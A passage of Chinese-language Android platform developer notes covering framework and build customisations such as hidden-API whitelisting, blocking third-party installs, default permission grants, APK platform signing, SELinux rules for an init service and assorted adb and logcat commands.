config_mainBuiltInDisplayCutout = _m-58,0l57.9,0l-0.9,54c0,0_-18.3,0.4_-32.3,-12.5c-13.6,-12.4_-12.6,-26.8_-14.1,-32.5c-1.4,-6_-8,-8.1_-10.6,-9z,m113,0l-58.3,0l1.4,54c0,0_18.3,0.4_32.3,-12.5c13.6,-12.5_12.6,-26.8_14,-32.5c1.5,-6_8.1,-8.1_10.6,-9z_
frameworks/base/core/res/res/values/dimens.xml
status_bar_height_portrait = 27dp
#vendor/mediatek/proprietary/packages/apps/SystemUI/res/values/dimens.xml
status_bar_left_clock_starting_padding = 15dp
```

## PhaseCheck aidl 添加

```text
1. 在工程目录下创建对应的包 com.sprd.engineermode，添加AIDL文件 IPhaseCheck.aidl 到该目录下
2. 在 build.gradle 中添加对应的规则把 aidl 文件编译进去
3. 使用的地方绑定对应的服务，拿到 IPhaseCheck 的接口之后使用 phaseCheckService.writeOffsetString(800 * 1024, "helloworld".getBytes()); 写入，用 phaseCheckService.readOffsetString(800 * 1024, 10); 读取。示例代码如下：
Intent serviceIntent = new Intent("com.sagereal.intent.action.PHASE_CHECK");
serviceIntent.setPackage("com.sprd.engineermode");
ServiceConnection conn = new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        IPhaseCheck phaseCheckService = IPhaseCheck.Stub.asInterface(service);
        try {
            boolean isSuc = phaseCheckService.writeOffsetString(800 * 1024, "helloworld".getBytes());
            String resultValue = phaseCheckService.readOffsetString(800 * 1024, 10);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onServiceDisconnected(ComponentName name) {
    }
};
bindService(serviceIntent, conn, Context.BIND_AUTO_CREATE);

如有问题再联系我。
```

## [知识点] include

```text
#include 的使用说明
>\#include叫做“文件包含”。它的功能是用来指定文件的全部内容替换程序中的命令行，从而使指定的文件与当前源文件连成一个源文件。
有如下两种形式：

#include "文件名"
#include <文件名>
文件包含这两种形式都可以使用，但是有以下几种区别：

使用尖括号：表示编译系统根据系统头文件存放的目录路径去搜索系统头文件，而不是在源文件目录去查找；
使用双引号：表示编译系统首先在当前的源文件目录中查找，若未找到才根据系统的头文件存放的目录路径去搜索系统头文件。
```

## Android系统修改/system/build.prop后开不了机的问题

```text
一、当你adb pull 把/system/build.prop 文件pull 出来修改后再adb
 push到设备里面reboot后，你会发现设备不能开机了。

二、查看该文件的权限，你会发现修改后再次重新push到设备里面的文件权限已经不一样了。原因是system/build.prop的文件权限已经变动，导致系统不能正常启动，需把权限修改回0644。

三、出于安全原因，禁止有的文件设置全域可写，相关的代码在system/core/init/util.cpp里面
```

## android充电提示音多次插拔无声

```text
压力测试，多次插拔充电器，之后无论怎么插拔都无声，必须重启。
问题是资源管理，Ringtone每次播放时才初始化，并且播放前没有判断是否有声音在播放。
直接上代码：

Index: frameworks/base/services/core/java/com/android/server/power/Notifier.java
===================================================================
--- frameworks/base/services/core/java/com/android/server/power/Notifier.java (版本 432)
+++ frameworks/base/services/core/java/com/android/server/power/Notifier.java (版本 435)
@@ -152,6 +152,8 @@
     // True if a user activity message should be sent.
     private boolean mUserActivityPending;
 
+    private Ringtone mRingtone; // @ + for BUG #
+
     public Notifier(Looper looper, Context context, IBatteryStats batteryStats,
             SuspendBlocker suspendBlocker, WindowManagerPolicy policy) {
         mContext = context;
@@ -187,6 +189,8 @@
         try {
             mBatteryStats.noteInteractive(true);
         } catch (RemoteException ex) { }
+
+        initChargingStartedSound(); // @ + for BUG #
     }
 
     /**
@@ -738,19 +742,43 @@
      * Plays the wireless charging sound for both wireless and non-wireless charging
      */
     private void playChargingStartedSound() {
+        // @ +- for BUG # {
+        //final String soundPath = Settings.Global.getString(mContext.getContentResolver(),
+        //        Settings.Global.CHARGING_STARTED_SOUND);
+        //if (isChargingFeedbackEnabled() && soundPath != null) {
+        //    final Uri soundUri = Uri.parse("file://" + soundPath);
+        //    if (soundUri != null) {
+        //        final Ringtone sfx = RingtoneManager.getRingtone(mContext, soundUri);
+        //        if (sfx != null) {
+        //            sfx.setStreamType(AudioManager.STREAM_SYSTEM);
+        //            sfx.play();
+        //        }
+        //    }
+        //}
+        if (mRingtone != null) {
+            mRingtone.stop();
+        }
+        if (isChargingFeedbackEnabled()) {
+            mRingtone.play();
+        }
+        // @ +- for BUG # }
+    }
+
+    // @ + for BUG # {
+    private void initChargingStartedSound() {
         final String soundPath = Settings.Global.getString(mContext.getContentResolver(),
                 Settings.Global.CHARGING_STARTED_SOUND);
-        if (isChargingFeedbackEnabled() && soundPath != null) {
+        if (soundPath != null) {
             final Uri soundUri = Uri.parse("file://" + soundPath);
             if (soundUri != null) {
-                final Ringtone sfx = RingtoneManager.getRingtone(mContext, soundUri);
-                if (sfx != null) {
-                    sfx.setStreamType(AudioManager.STREAM_SYSTEM);
-                    sfx.play();
+                mRingtone = RingtoneManager.getRingtone(mContext, soundUri);
+                if (mRingtone != null) {
+                    mRingtone.setStreamType(AudioManager.STREAM_SYSTEM);
                 }
             }
         }
     }
+    // @ + for BUG # }
 
     private void showWirelessChargingStarted(int batteryLevel) {
         playWirelessChargingVibration();
```

## [反射] android P非systemuid应用如何通过反射调用hide接口——系统修改方案

```text
高通8909平台，项目需要集成GMS。开机后，SetupWizard一直报错，查看log发现是调用了系统的hide方法，显示Accessing hidden method进而报错java.lang.NoSuchMethodException。

百度找到了一篇入门贴：
https://blog.csdn.net/firedancer0089/article/details/82969969

然后找了一篇科普贴：
https://developer.android.com/distribute/best-practices/develop/restrictions-non-sdk-interfaces

官方科普贴有临时调试方案：
Android 9 (API level 28)
To enable access, use the following adb commands:

adb shell settings put global hidden_api_policy_pre_p_apps  1
adb shell settings put global hidden_api_policy_p_apps 1
To reset the API enforcement policy to the default settings, use the following commands:

adb shell settings delete global hidden_api_policy_pre_p_apps
adb shell settings delete global hidden_api_policy_p_apps

You can set the integer in the API enforcement policy to one of the following values:

0: Disable all detection of non-SDK interfaces. Using this setting disables all log messages for non-SDK interface usage and prevents you from testing your app using the StrictMode API. This setting is not recommended.
1: Enable access to all non-SDK interfaces, but print log messages with warnings for any non-SDK interface usage. Using this setting also allows you to test your app using the StrictMode API.
2: Disallow usage of non-SDK interfaces that belong to either the blacklist or the greylist and are restricted for your target API level.
设置0之后，重启设备可以解决我的问题，之后就找靠谱的解决方案。

可以从官方文档看到，除了临时调试方案，还有黑名单、灰名单和白名单，但是没有写如何修改。

重点来了，仅针对QC平台，我修改的文件：

frameworks/base/data/etc/hiddenapi-package-whitelist.xml
<config>
    <hidden-api-whitelisted-app package="android.ext.services" />
    <hidden-api-whitelisted-app package="com.android.apps.tag" />
    <hidden-api-whitelisted-app package="com.android.basicsmsreceiver" />
    <hidden-api-whitelisted-app package="com.android.bookmarkprovider" />
    <hidden-api-whitelisted-app package="com.android.calllogbackup" />
    <hidden-api-whitelisted-app package="com.android.camera" />
    <hidden-api-whitelisted-app package="com.android.car.dialer" />
    <hidden-api-whitelisted-app package="com.android.car.messenger" />
    <hidden-api-whitelisted-app package="com.android.car.overview" />
    <hidden-api-whitelisted-app package="com.android.car.stream" />
    <hidden-api-whitelisted-app package="com.android.companiondevicemanager" />
    <hidden-api-whitelisted-app package="com.android.dreams.basic" />
    <hidden-api-whitelisted-app package="com.android.gallery" />
    <hidden-api-whitelisted-app package="com.android.launcher3" />
    <hidden-api-whitelisted-app package="com.android.mtp" />
    <hidden-api-whitelisted-app package="com.android.musicfx" />
    <hidden-api-whitelisted-app package="com.android.packageinstaller" />
    <hidden-api-whitelisted-app package="com.android.printservice.recommendation" />
    <hidden-api-whitelisted-app package="com.android.printspooler" />
    <hidden-api-whitelisted-app package="com.android.providers.blockednumber" />
    <hidden-api-whitelisted-app package="com.android.providers.calendar" />
    <hidden-api-whitelisted-app package="com.android.providers.contacts" />
    <hidden-api-whitelisted-app package="com.android.providers.downloads" />
    <hidden-api-whitelisted-app package="com.android.providers.downloads.ui" />
    <hidden-api-whitelisted-app package="com.android.providers.media" />
    <hidden-api-whitelisted-app package="com.android.providers.tv" />
    <hidden-api-whitelisted-app package="com.android.providers.userdictionary" />
    <hidden-api-whitelisted-app package="com.android.smspush" />
    <hidden-api-whitelisted-app package="com.android.spare_parts" />
    <hidden-api-whitelisted-app package="com.android.statementservice" />
    <hidden-api-whitelisted-app package="com.android.storagemanager" />
    <hidden-api-whitelisted-app package="com.android.systemui.plugins" />
    <hidden-api-whitelisted-app package="com.android.terminal" />
    <hidden-api-whitelisted-app package="jp.co.omronsoft.openwnn" />
</config>
只需要加上应用包名即可。
```

## [CMD] adb多用户操作

```text
查看用户列表
adb shell pm list users

创建新用户
adb shell pm create-user [–profileOf USER_ID]  [–managed]  USER_NAME
adb shell pm create-user 10 godv

启动和切换用户
adb shell am switch-user USER_ID
adb shell am start-user USER_ID

安装应用到某个用户下
adb install –user USER_ID name.apk

删除用户
adb shell pm remove-user USER_ID

为了多用户下的数据安全性，在每个新用户创建之初，不管是外部存储（External Storage）还是app data目录，Android都为其准备了独立的文件存储
/storage/emulated/下拥有不同的用户分区
/storage/emulated/0
/storage/emulated/10
代码查看不同用户 以SDK为例 反射获取

int uid = -1;
try {
    Class clz = Class.forName("android.os.UserHandle");
    Method m = clz.getDeclaredMethod("myUserId");
    uid = (int) m.invoke(null);
} catch (Exception e) {
    e.printStackTrace();
}
ContentResolver下的uri

content:// USER_ID @media/external/audio/media
即可获取不同用户下的不同数据 
```

## Pointer location功能研究

```text
frameworks/base/services/core/java/com/android/server/wm/DisplayPolicy.java

private void enablePointerLocation() {
    if (mPointerLocationView != null) {
        return;
    }

    mPointerLocationView = new PointerLocationView(mContext);
    mPointerLocationView.setPrintCoords(false);
    final WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT);
    lp.type = WindowManager.LayoutParams.TYPE_SECURE_SYSTEM_OVERLAY;
    lp.flags = WindowManager.LayoutParams.FLAG_FULLSCREEN
            | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
            | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
            | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN;
    lp.layoutInDisplayCutoutMode = LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
    if (ActivityManager.isHighEndGfx()) {
        lp.flags |= WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED;
        lp.privateFlags |=
                WindowManager.LayoutParams.PRIVATE_FLAG_FORCE_HARDWARE_ACCELERATED;
    }
    lp.format = PixelFormat.TRANSLUCENT;
    lp.setTitle("PointerLocation - display " + getDisplayId());
    lp.inputFeatures |= WindowManager.LayoutParams.INPUT_FEATURE_NO_INPUT_CHANNEL;
    final WindowManager wm = mContext.getSystemService(WindowManager.class);
    wm.addView(mPointerLocationView, lp);
    mDisplayContent.registerPointerEventListener(mPointerLocationView);
}

private void disablePointerLocation() {
    if (mPointerLocationView == null) {
        return;
    }

    mDisplayContent.unregisterPointerEventListener(mPointerLocationView);
    final WindowManager wm = mContext.getSystemService(WindowManager.class);
    wm.removeView(mPointerLocationView);
    mPointerLocationView = null;
}

主要就是通过 WindowManager 添加了一个 PointerLocationView
```

## 屏幕取色

```text
Android屏幕绘制基本与linux相同，都是使用Framebuffer机制来绘制屏幕。FrameBuffer提供接口将显示设备抽象为帧缓冲区。用户可以将它看成是显示内存的一个映像，将其映射到进程地址空间之后，就可以直接进行读写操作，应用程序可以简单地通过改变这段内存的值来改变屏幕上某一点的颜色。例如如果你想把一张bitmap图片显示到屏幕上去，你只要解析bitmap之后把数据bit copy进framebuffer，屏幕就会立刻显示出来。一般Linux的framebuffer 对应/dev/fb0这个字符设备文件。 Android稍微改了改，放在/dev/graphics/fb0下。 

这样我们就可以通过读取fb0来获取屏幕信息了。比如想要获取屏幕上坐标为（x,y） 一点的像素值，就可以先获取fb0的比特流，读取相应位置的数据。如果屏幕是32位色的，一个像素点的大小就是32/8=4byte。那么（x,y）点在fb0中的位置就是从(width*y+x)*4开始、长4byte的一段。
```

## Android禁止安装三方应用(屏蔽所有安装应用的方式)

```text
android系统安装应用有四种方式

1.系统应用安装――开机时完成，没有安装界面

2.网络下载应用安装――通过market应用完成，没有安装界面

3.ADB工具安装――没有安装界面。

4.第三方应用安装――通过现有的APK文件安装，有安装界面，由packageinstaller.apk应用处理安装及卸载过程的界面。

1.禁止ADB和应用商店安装由“frameworks\base\services\core\java\com\android\server\pm\PackageManagerService.java”来控制安装

需要屏蔽的话，只需要修改这个文件里边的代码。

  //禁止第三方应用安装的标志
private boolean APK_INSTALL_FINISH = SystemProperties.getBoolean("persist.sys.horion.apk.install", false);
 class PackageHandler extends Handler{
                    .......
 void doHandleMessage(Message msg) {
            switch (msg.what) {
                case INIT_COPY: {
         ++++       if(APK_INSTALL_FINISH){
         ++++               return ;
         ++++           }
                    HandlerParams params = (HandlerParams) msg.obj;
                    int idx = mPendingInstalls.size();
                    if (DEBUG_INSTALL) Slog.i(TAG, "init_copy idx=" + idx + ": " + params);
                    ........
            }
        }
    }
}
 

public PackageManagerService(Context context, Installer installer,
            boolean factoryTest, boolean onlyCore) {
            ......
             sMtkSystemServerIns.addBootEvent("Android:PMS_scan_END");
            Slog.i(TAG, "Time to scan packages: "
                    + ((SystemClock.uptimeMillis()-startTime)/1000f)
                    + " seconds");
       +++   APK_INSTALL_FINISH = true;
            // If the platform SDK has changed since the last time we booted,
            // we need to re-grant app permission to catch any new ones that
}
在构造函数中这个位置将APK_INSTALL_FINISH设置为true,此时系统内置应用完成了安装。PackageManagerService.java  PackageHandler中做处理，如果APK_INSTALL_FINISH为true 禁止安装。至此，就完成了禁止禁止ADB和应用商店安装的屏蔽

2.禁止手动安装

手动安装由\packages\apps\PackageInstaller完成，禁止手动安装只需要在这里边处理，在InstallStart.java中

//禁止第三方应用安装的标志
    private boolean APK_INSTALL_FINISH = SystemProperties.getBoolean("persist.sys.horion.apk.install", false);
public class InstallStart extends Activity {
                ........
 
        if (nextActivity != null) {
++++            if(!APK_INSTALL_FINISH) {
//          startActivity(nextActivity);
++++            Toast.makeText(InstallStart.this, android.R.string.prohibit_install_message, Toast.LENGTH_LONG).show();
++++            Intent result = new Intent();
++++            result.putExtra(Intent.EXTRA_INSTALL_RESULT,
++++                    PackageManager.INSTALL_FAILED_INVALID_URI);
++++            setResult(RESULT_FIRST_USER, result);
++++            } else{
                startActivity(nextActivity);
            }
        }
        finish();
    }
.......
}
完成对手动安装apk的屏蔽
```

## DarkTheme

```text
values/styles.xml
<resources>
    <!-- Base application theme. -->
    <style name="AppTheme" parent="Theme.AppCompat.DayNight">
        <!-- Customize your theme here. -->
    </style>
</resources>

values-night/styles.xml
<resources>
    <!-- Base application theme. -->
    <style name="AppTheme" parent="Theme.AppCompat.Light">
        <!-- Customize your theme here. -->
    </style>
</resources>

values-night/colors.xml
```

## [log] 修改 kernel 打印级别

```text
查看当前打印级别
cat /proc/sys/kernel/printk
a40-p1:/ # cat /proc/sys/kernel/printk
3       1       1       7

临时修改打印级别
echo 1 4 1 7 > /proc/sys/kernel/printk
这里的四个数字说明，数值越小，优先级越高

3：控制台日志级别：优先级高于该值的消息将被打印至控制台
1：默认的消息日志级别：将用该优先级来打印没有优先级的消息
1：最低的控制台日志级别：控制台日志级别可被设置的最小值(最高优先级)
7：默认的控制台日志级别：控制台日志级别的缺省值

这四个变量在kernel/printk.c中定义

配置打印级别
vim lichee/tools/pack/chips/sun8iw11p1/configs/default/env.cfg
loglevel 就是控制台的打印级别

级别说明：
0：系统不可用
1：必须立即采取行动
2：关键条件
3：错误条件
4：警告条件
5：正常但重要的条件
6：信息性
7：调试级别消息
```

## 预装软件默认授权

```text
# frameworks/base/services/core/java/com/android/server/pm/permission/PermissionManagerService.java
在private void grantPermissions(PackageParser.Package pkg, boolean replace, String packageOfInterest, PermissionCallback callback) 方法

// PackageParser.Package pkg：通过pkg可以获取到包名，当前app需要申请的所有权限等等信息
// 如果只对某个包赋予权限，应该改在这过滤

synchronized (mLock) {
    final int N = pkg.requestedPermissions.size(); // 获取AndroidManifest中请求的权限个数

    for (int i = 0; i < N; i++) {
        final String permName = pkg.requestedPermissions.get(i); // 分别对包的每个权限进行遍历，判断
        final BasePermission bp = mSettings.getPermissionLocked(permName);
        final boolean appSupportsRuntimePermissions = pkg.applicationInfo.targetSdkVersion >= Build.VERSION_CODES.M;

        if (DEBUG_INSTALL) {
            Log.i(TAG, "Package " + pkg.packageName + " checking " + permName + ": " + bp);
        }



    final String perm = bp.getName();
    boolean allowedSig = false;
    // int grant = GRANT_DENIED; // 默认权限值为拒绝
    int grant = GRANT_INSTALL;   // 改为普通权限

    // Keep track of app op permissions.
    if (bp.isAppOp()) {
        mSettings.addAppOpPackage(perm, pkg.packageName);
    }

    if (bp.isNormal()) { // 普通权限检查
        // For all apps normal permissions are install time ones.
        grant = GRANT_INSTALL;
    } else if (bp.isRuntime()) { // 运行时危险权限检查
        // If a permission review is required for legacy apps we represent
        // their permissions as always granted runtime ones since we need
        // to keep the review required permission flag per user while an
        // install permission's state is shared across all users.
        if (!appSupportsRuntimePermissions && !mSettings.mPermissionReviewRequired) {
            // For legacy apps dangerous permissions are install time ones.
            grant = GRANT_INSTALL;
        } else if (origPermissions.hasInstallPermission(bp.getName())) {
            // For legacy apps that became modern, install becomes runtime.
            grant = GRANT_UPGRADE;
        } else if (isLegacySystemApp) {
            // For legacy system apps, install becomes runtime.
            // We cannot check hasInstallPermission() for system apps since those
            // permissions were granted implicitly and not persisted pre-M.
            grant = GRANT_UPGRADE;
        } else {
            // For modern apps keep runtime permissions unchanged.
            // grant = GRANT_RUNTIME;
            grant = GRANT_INSTALL; // 改为普通权限
        }
    } else if (bp.isSignature()) {
        // For all apps signature permissions are install time ones.
        allowedSig = grantSignaturePermission(perm, pkg, bp, origPermissions);
        if (allowedSig) {
            grant = GRANT_INSTALL;
        }
    }

    if (DEBUG_PERMISSIONS) {
        Slog.i(TAG, "Granting permission " + perm + " to package " + pkg.packageName);
    }

```

## [CMD] 设置虚拟导航栏撑出屏幕外

```text
adb shell wm overscan 0,0,0,-80
```

## 发送通知Notification

```text
private final String ID = "channel_001";
private final String NAME = "name";
public void onViewClicked() {
    //通知管理器
    NotificationManager notificationManager = (NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);

    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        //开辟一个通道
        NotificationChannel mChannel = new NotificationChannel(ID, NAME, NotificationManager.IMPORTANCE_LOW);
        notificationManager.createNotificationChannel(mChannel);
        Notification.Builder builder = new Notification.Builder(this);
        //设置属性
        builder.setSmallIcon(R.mipmap.ic_launcher);
        builder.setContentTitle("标题");
        builder.setContentText("我是内容");
        //这个要和创建通道的ID一致
        builder.setChannelId(ID);

        //创建对象,发送的就是这个对象
        Notification build = builder.build();
        notificationManager.notify(1,build);
    }
}
```

## 护眼模式

```text
/**
 * 添加护眼模式浮层
 */
protected void initEye() {
    ViewGroup content = ((ViewGroup) findViewById(android.R.id.content));
    view = new FrameLayout(this);
    view.setBackgroundColor(Color.TRANSPARENT);
    WindowManager.LayoutParams params = new WindowManager.LayoutParams();
    params.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
            | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
            | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
    params.width = WindowManager.LayoutParams.MATCH_PARENT;
    params.height = WindowManager.LayoutParams.MATCH_PARENT;
//        ViewGroup.LayoutParams layoutParams = new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT);
    content.addView(view, params);
}

/**
 * 开启护眼模式
 */
public void openEye() {
    view.setBackgroundColor(getFilterColor(30));
}

/**
 * 关闭护眼模式
 */
public void closeEye() {
    view.setBackgroundColor(Color.TRANSPARENT);
}

/**
 * 过滤蓝光
 *
 * @param blueFilterPercent 蓝光过滤比例[10-30-80] 
 */
public int getFilterColor(int blueFilterPercent) {
    int realFilter = blueFilterPercent;
    if (realFilter < 10) {
        realFilter = 10;
    } else if (realFilter > 80) {
        realFilter = 80;
    }
    int a = (int) (realFilter / 80f * 180);
    int r = (int) (200 - (realFilter / 80f) * 190);
    int g = (int) (180 - (realFilter / 80f) * 170);
    int b = (int) (60 - realFilter / 80f * 60);
    return Color.argb(a, r, g, b);
}
```

## [CMD]  [签名] 签名脚本

```text
#!/bin/bash

SIGN_APK_KEY_DIR="${HOME}/sign_apk/key"

function __help() {
 echo --------------------------------------
 echo 'Usage: ./sign_apk.sh apk'
 echo
 echo 'example: signed apk is placed in directory where command is executed'
 echo '         ./sign_apk.sh bleutooth.apk'
 echo 'example: signed apk is placed in directory pointed'
 echo '         ./sign_apk.sh bleutooth.apk ~/'
 echo --------------------------------------
}

function sign_apk() {
    if [ $# -lt 1 ] ;then
            echo "param error"
            __help
            return 1
    fi
 
 local cur_dir=$(pwd)
    echo cur_dir: ${cur_dir}
 
 local apk=$1
 local apk_path=
 local apk_name= 
 
 local out_path=$cur_dir
 
 if [ ! -e $apk ] ;then
  echo $apk does not exist!
  exit -1
 fi
 
 if [[ -n $2 ] ] ;then
  if [ ! -d $2 ] ;then
   echo output directory\($2\) does not exist!
   exit -1
  fi
  out_path=$2
 fi 
 
 apk_name=`basename $apk .apk`
 apk_path=${1%.*}

 if [[ $apk =~ "/" ] ] ;then
  apk_path=${1%/*}
 else
  apk_path="."
 fi

    
    # cd ${SIGN_APK_DIR}
    
    echo ----------------------------
 echo $apk
 echo apk_path:  $apk_path
 echo apk_name:  $apk_name
 echo out_path:  $out_path
 echo ----------------------------

 echo signing ...
 java -jar ${SIGN_APK_KEY_DIR}/signapk.jar -w ${SIGN_APK_KEY_DIR}/platform.x509.pem ${SIGN_APK_KEY_DIR}/platform.pk8  ${apk} ${SIGN_APK_KEY_DIR}/${apk_name}_signed.apk
    cp ${SIGN_APK_KEY_DIR}/${apk_name}_signed.apk ${out_path}/${apk_name}.apk
 echo signed succeed!!!
}
```

## [make] Android中不打包一些apk

```text
1、在device目录下建立Android.mk
ifneq ($(filter konka828,$(TARGET_DEVICE)),)
include $(CLEAR_VARS)
LOCAL_MODULE := remove_unused_apps

LOCAL_MODULE_CLASS := FAKE
LOCAL_MODULE_SUFFIX := $(COMMON_ANDROID_PACKAGE_SUFFIX)
LOCAL_OVERRIDES_PACKAGES := \
    BackupRestoreConfirmation \
    BasicDreams \
    Browser \
    MLatinIME \
    MPinyinIME \
    MTvProvider

include $(BUILD_SYSTEM)/base_rules.mk

$(LOCAL_BUILT_MODULE):
    $(hide) echo "Fake: $@"
    $(hide) mkdir -p $(dir $@)
    $(hide) touch $@

PACKAGES.$(LOCAL_MODULE).OVERRIDES := $(strip $(LOCAL_OVERRIDES_PACKAGES))
endif

2、在device.mk下增加如下部分
# Exclude unused apps from aosp_base.mk
# Note filter-out is not an option because PRODUCT_PACKAGES contains
PRODUCT_PACKAGES += \
    remove_unused_apps
```

## [init]  [prop] android开发笔记之系统属性(ro.com.google.clientidbase.ms)随卡适配

```text
客户提了一个小需求，就是要将系统属性(ro.com.google.clientidbase.ms)随卡适配。
具体要求是：
如果插中国的卡，系统属性ro.com.google.clientidbase.ms值为android-orange-cn。
如果插法国的卡，系统属性ro.com.google.clientidbase.ms值为android-orange-fr。
如果插西班牙的卡，系统属性ro.com.google.clientidbase.ms值为android-orange-es。

需求实现
这个功能，怎么样，是不是非常简单。
哈哈，如果你这样认为，我担心你搞不定此问题。此问题不是那么好实现的。
但是，我们公司还是有牛人啊，将其实现了。

大概分析实现流程
监听到插入sim卡手机后，读取sim卡的国家缩写码，再将此读取到的sim卡的国家缩写码赋值给系统属性ro.com.google.clientidbase.ms。

感觉是不是太简单了，如果你这样觉得，那是因为你不知道实现此问题的关键所在。ro开头的系统属性，我们一般是只有读取的权限，是没有写的权限噢。
所以，此问题的关键点：

就在与给系统属性ro.com.google.clientidbase.ms赋值的写的权限。

具体实现
（1）监听到插入sim卡后，读取sim卡的国家缩写码,将系统属性gsm.operator.googleclientbase值设置为true。

在\frameworks\base\telephony\java\com\android\internal\telephony\TelephonyProperties.java文件中，定义系统属性gsm.operator.googleclientbase和gsm.sim.operator.iso-country：

/** ISO country code equivalent for the SIM provider's country code*/
static String PROPERTY_ICC_OPERATOR_ISO_COUNTRY = "gsm.sim.operator.iso-country";

//add codes begin
static final String PROPERTY_GOOGLE_CLIENTIDBASE_SET = "gsm.operator.googleclientbase";
//add codes end
在\frameworks\base\telephony\java\android\telephony\TelephonyManager.java文件中，将读取sim卡的国家缩写码保存到gsm.sim.operator.iso-country中，再将系统属性gsm.operator.googleclientbase值设置为true，从而触发init.rc中的服务。

public void setSimCountryIsoForPhone(int phoneId, String iso) {
    setTelephonyProperty(phoneId,
             TelephonyProperties.PROPERTY_ICC_OPERATOR_ISO_COUNTRY, iso);
    //add codes begin
    if (!android.text.TextUtils.isEmpty(iso)) {
            SystemProperties.set(TelephonyProperties.PROPERTY_GOOGLE_CLIENTIDBASE_SET, "true");
    }
    //add codes end
}
(2)init.rc定义给系统属性ro.com.google.clientidbase.ms赋值的服务：
当系统属性gsm.operator.googleclientbase值设置为true，从而触发init.rc中的服务client_search，并指定此服务为/system/bin/googleclientidbaseprop。
至于为什么在init.rc来执行给系统属性ro.com.google.clientidbase.ms赋值的操作，还是因为权限的问题，此文件可以有root权限，这其实是可以从此文件的路径可以看出。

\system\core\rootdir\init.rc

#add codes begin
#当系统属性设置为true时，启动服务client_search
on property:gsm.operator.googleclientbase=true
    start client_search

#给服务client_search指定bin文件和添加对应权限
service client_search /system/bin/googleclientidbaseprop
    user root
    group root
    disabled
    oneshot
#add codes end
(3)googleclientidbaseprop应用，主要功能是将从gsm.sim.operator.iso-country读取到的sim卡的国家缩写码赋值给ro.com.google.clientidbase.ms。

这其实就是一个我们平时的应用，只是，他为一个bin执行文件。
apps\GoogleClientIdBase\Android.mk

LOCAL_PATH:= $(call my-dir)
include $(CLEAR_VARS)
LOCAL_SRC_FILES:= \
    googleclientidbaseprop_main.cpp
LOCAL_CFLAGS += -Wall -Werror -Wunused -Wunreachable-code
LOCAL_SHARED_LIBRARIES := \
    libcutils \
    liblog \
    libutils
LOCAL_MODULE:= googleclientidbaseprop
ifdef TARGET_32_BIT_SURFACEFLINGER
LOCAL_32_BIT_ONLY := true
endif
include $(BUILD_EXECUTABLE)
apps\GoogleClientIdBase\googleclientidbaseprop_main.cpp

#undef NDEBUG
#define LOG_TAG "Googleclientidbaseprop"
#include <cutils/properties.h>
#include <utils/Log.h>
#include <string.h>

using namespace android;

#define PROPERTY_OPERATOR_ISO_COUNTRY "gsm.sim.operator.iso-country"
#define RO_COM_GOOGLE_CLIENTIDBAEE_MS_PROP "ro.com.google.clientidbase.ms"

int main()
{
    char value[PROPERTY_VALUE_MAX]  = "";
    char value_ms[PROPERTY_VALUE_MAX]  = "";
    char propValue[PROPERTY_VALUE_MAX]  = "android-orange-";
    property_get(PROPERTY_OPERATOR_ISO_COUNTRY, value, "");
    property_get(RO_COM_GOOGLE_CLIENTIDBAEE_MS_PROP, value_ms, "");
    ALOGD("First Get prop %s: %s", RO_COM_GOOGLE_CLIENTIDBAEE_MS_PROP, value_ms);
    if(!(0 == strcmp("", value_ms))) return 0;

    if (!(0 == strcmp("", value))) {
        strncat(propValue, value, strlen(value));
        property_set(RO_COM_GOOGLE_CLIENTIDBAEE_MS_PROP, propValue);
    }
    memset(value, 0, PROPERTY_VALUE_MAX);
    property_get(RO_COM_GOOGLE_CLIENTIDBAEE_MS_PROP, value, "");
    ALOGD("Get prop %s: %s", RO_COM_GOOGLE_CLIENTIDBAEE_MS_PROP, value);
    return 0;
}
在*.mk文件中，将此应用加进来：

PRODUCT_PACKAGES += googleclientidbaseprop
(4)添加对应的权限

4.1 预置要随卡适配的系统属性的读写权限：
在文件device/qcom/sepolicy/common/property_contexts中，定义要修改的系统属性对应的属性名：

ro.com.google.clientidbase.ms       u:object_r:googleclient_base_prop:s0
再在文件device/qcom/sepolicy/common/property.te中，定义对应要修改的系统属性为系统属性：

type googleclient_base_prop, property_type;
4.2 init.rc的服务googleclientidbaseprop 读写权限：

再在device/qcom/sepolicy/common/file_contexts文件中，定义应用的执行名字：

/system/bin/googleclientidbaseprop u:object_r:googleclientidbaseprop_exec:s0
再在device/qcom/sepolicy/common/googleclientidbaseprop.te文件中，定义此服务的相关权限：

type googleclientidbaseprop, domain;
type googleclientidbaseprop_exec, exec_type, file_type;

init_daemon_domain(googleclientidbaseprop)

allow googleclientidbaseprop system_file:file execute_no_trans;
# Property Service write
set_prop(googleclientidbaseprop, googleclient_base_prop)
4.3 adb shell系统属性的读写权限：
这就是要在device/qcom/sepolicy/common/shell.te文件中添加随卡适配的系统属性的读写权限。

allow shell googleclient_base_prop:file { read getattr open };
1
可以看出，此系统权限的相关设置是比较复杂的，这也是此功能的实现的关键所在。
```

## [CMD] 打印Debug日志信息

```text
adb logcat |grep -E  "System.err|AndroidRuntime|MessageQueue|CONSOLE|W/Bundle|dalvikvm|StrictMode"
```

## [CMD] 专门为Android优化的全文查找方法

```text
grep  -E $1 --exclude-dir={.git,lib,.gradle,.idea,build,captures} --exclude={*.png,*.jpg,*.jar}  . -R --color=always -n
```

## [CMD] android shell命令模拟充电事件

```text
通过 adb shell dumpsys battery unplug 命令让设备进入未连接充电的模式。

通过 adb shell dumpsys deviceidle step [light|deep]  强行进入Doze模式。

退出Doze模式，让手机恢复正常需要复位充电模式: adb shell dumpsys battery reset。

方便测试状态栏电池状态更新的bug。
```

## [性能] mtk平台android提速

```text
